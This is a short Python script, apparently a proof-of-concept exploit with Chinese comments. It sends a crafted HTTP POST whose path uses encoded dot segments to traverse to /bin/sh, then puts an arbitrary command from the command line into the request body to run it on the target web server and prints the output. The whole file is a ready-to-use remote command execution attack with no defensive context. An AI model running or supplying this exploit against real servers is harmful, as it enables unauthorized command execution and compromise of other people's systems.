import sys
import socket

def execute_command(host, port, command):
    # 构造 HTTP 请求，包括有效负载数据
    payload = f"POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n"
    payload += f"Content-Length: 1\r\n\r\necho\necho\n{command} 2>&1"

    # 建立套接字连接并发送请求
    try:
        with socket.create_connection((host, port)) as sock:
            sock.sendall(payload.encode())

            # 接收响应并以逐行方式处理输出
            while True:
                response = sock.recv(1024).decode()
                if not response:
                    break
                lines = response.split('\r\n')
                for line in lines:
                    if line.strip() != "":
                        print(line)
    except socket.error as e:
        print(f"连接错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("用法：python test.py <主机> <端口> <命令>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    command = " ".join(sys.argv[3:])
    
    # 执行命令
    execute_command(host, port, command)
